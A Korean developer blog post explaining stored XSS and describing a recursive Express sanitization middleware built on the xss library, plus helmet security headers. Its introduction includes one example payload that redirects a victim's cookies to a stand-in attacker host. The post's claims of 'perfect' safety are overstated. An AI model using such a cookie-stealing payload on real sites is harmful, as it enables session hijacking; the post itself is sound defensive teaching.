---
title: "XSS의 동작 원리와 Express 미들웨어를 활용한 완벽 방어기"
date: 2026-03-31T17:00:00+09:00
draft: false
summary: "사용자의 브라우저를 노리는 XSS(교차 사이트 스크립팅) 공격. 그 개념과 위험성을 알아보고, 실제 Node.js/Express 프로젝트에서 재귀적 미들웨어를 통해 어떻게 요청 데이터를 안전하게 필터링했는지 공유합니다."
categories: ["Security", "Backend"]
tags: ["XSS", "Security", "Express", "Middleware", "Troubleshooting"]
---

## 1. 프론트엔드를 노리는 조용한 암살자, XSS

이전 글에서 다뤘던 SQL Injection이 '데이터베이스'를 노리는 공격이었다면, 이번에 다룰 **XSS(Cross-Site Scripting, 교차 사이트 스크립팅)** 는 **'사용자의 브라우저(클라이언트)'** 를 노리는 대표적인 웹 취약점입니다.

공격의 핵심은 아주 단순합니다. **웹 사이트에 악의적인 스크립트(주로 JavaScript)를 주입하여, 다른 사용자의 브라우저에서 그 스크립트가 실행되게 만드는 것"** 입니다.

### 어떻게 동작할까?
게시판의 댓글 기능을 상상해 봅시다. 공격자가 댓글 입력창에 평범한 텍스트 대신 아래와 같은 스크립트를 작성하여 등록합니다.

```javascript
  // 사용자의 세션 토큰(쿠키)을 해커의 서버로 몰래 전송
  location.href = '[http://hacker.com/steal?cookie=](http://hacker.com/steal?cookie=)' + document.cookie;
```

서버가 이 입력을 아무런 의심 없이 DB에 저장(Stored XSS)하고, 이후 일반 사용자가 해당 게시글을 클릭하면 어떻게 될까?
피해자의 브라우저는 화면에 댓글을 렌더링하다가 스크립트 태그를 만나면, 단순한 문자가 아닌 **'실행해야 할 코드'** 로 인식하고 즉시 실행해 버립니다. 결과적으로 피해자는 자신도 모르는 사이에 로그인 세션을 탈취당하게 됩니다.

## 2. 프로젝트(HI-REMS)에서 적용한 XSS 방어 전략
이러한 XSS를 막기 위한 가장 확실한 방법은, 클라이언트로부터 들어오는 모든 입력값에서 < 나 > 같은 특수문자를 단순 문자로 변환(치환)해 버리는 Sanitization(무해화) 작업입니다.

제가 진행한 에너지 데이터 분석 플랫폼(HI-REMS) 프로젝트의 백엔드(Node.js + Express)에서는 이를 미들웨어 단에서 일괄 처리하도록 구현했습니다.

**단계 1** : 재귀적 필터링 함수 설계
클라이언트의 요청은 단순한 문자열일 수도 있지만, 객체 안에 배열이 있고 그 안에 다시 객체가 있는 복잡한 JSON 형태일 수도 있습니다. 따라서 모든 뎁스(Depth)의 데이터를 파고들어 필터링하는 재귀(Recursive) 함수를 만들었습니다. npm의 xss 라이브러리를 활용했습니다.

```javascript

const xss = require('xss');

const xssClean = (obj) => {
  // 1. 문자열인 경우: xss 라이브러리를 통해 즉시 태그 무해화 처리
  if (typeof obj === 'string') return xss(obj);
  
  // 2. 객체나 배열인 경우: 내부 속성을 순회하며 자기 자신(xssClean)을 재귀 호출
  if (typeof obj === 'object' && obj !== null) {
    for (let key in obj) {
      obj[key] = xssClean(obj[key]);
    }
  }
  return obj;
};
```

**단계 2** : Express 전역 미들웨어로 적용
컨트롤러(Controller)마다 일일이 필터링 함수를 호출하는 것은 휴먼 에러를 유발하기 쉽습니다. 따라서 라우터를 타기 전, 애플리케이션 최상단에서 모든 body, query, params를 덮어씌우는 전역 미들웨어로 등록했습니다.

```javascript

app.use((req, res, next) => {
  if (req.body) req.body = xssClean(req.body);
  if (req.query) req.query = xssClean(req.query);
  if (req.params) req.params = xssClean(req.params);
  next();
});
```

**추가 방어** : Helmet을 통한 HTTP 보안 헤더 설정
XSS 방어에 힘을 실어주기 위해 helmet 패키지도 적용했습니다. helmet은 브라우저가 스크립트 실행 권한을 엄격하게 통제하도록 다양한 HTTP 보안 헤더(예: X-XSS-Protection 등)를 자동으로 설정해 주는 든든한 방어막입니다.

```javascript
const helmet = require('helmet');
app.use(helmet());
```

## 3. 방어가 잘되었는지 테스트

### 3.1. 나쁜 태그로 확인
![alt text](/images/image-9.png)

![alt text](/images/image-10.png)

> `<` 는 `&lt;` 로, `>` 는 `&gt;` (HTML Entity)로 변환되었습니다. 이제 이 데이터가 프론트엔드로 다시 전달되어 화면에 그려지더라도, 브라우저는 이를 스크립트 코드가 아닌 단순한 "문자열(Text)"로만 렌더링하므로 완벽하게 안전합니다.

### 3.2 . Helmet이 적용한 강력한 HTTP 보안 헤더

> 네트워크 탭을 확인해 보면 서버가 응답할 때 강력한 보안 헤더들을 함께 내려보내는 것을 볼 수 있습니다.
각 헤더가 브라우저에서 어떻게 XSS와 취약점을 막아내는지 보자면,

![alt text](/images/image-11.png)


- **HttpOnly 쿠키 (2중 방어)** : 발급된 토큰 쿠키에 HttpOnly 속성이 부여되어 있어, 설령 XSS 공격이 성공하더라도 해커가 자바스크립트를 이용해 세션 토큰에 접근하는 것을 원천 차단합니다.

- **content-security-policy (CSP)** : 신뢰할 수 있는 소스(self)에서만 스크립트나 이미지를 불러오도록 제한하여 악의적인 외부 스크립트 삽입을 차단합니다.

- **x-content-type-options: nosniff** : 브라우저가 파일의 MIME 타입을 임의로 추측하지 못하게 하여 파일 업로드 취약점을 막습니다.

- **strict-transport-security (HSTS)** : 무조건 HTTPS 통신만 강제하도록 설정되어 있습니다.


<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options">X-Content-Type-Options</a>

<a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security">HSTS</a>

<a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Guides/CSP">CSP</a>

<a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Reference/Headers/Set-Cookie">Set-Cookie</a>

## 4. 마치며
> XXS를 적용하는 과정에서 이론으로만 알고 있던 내용을 실제로 재귀적 필터링 미들웨어를 직접 구현하여 스크립트 공격을 방어해보면서, Express 프레임워크의 요청/응답 생명주기를 한층 더 알게 되었던 계기가 되었습니다.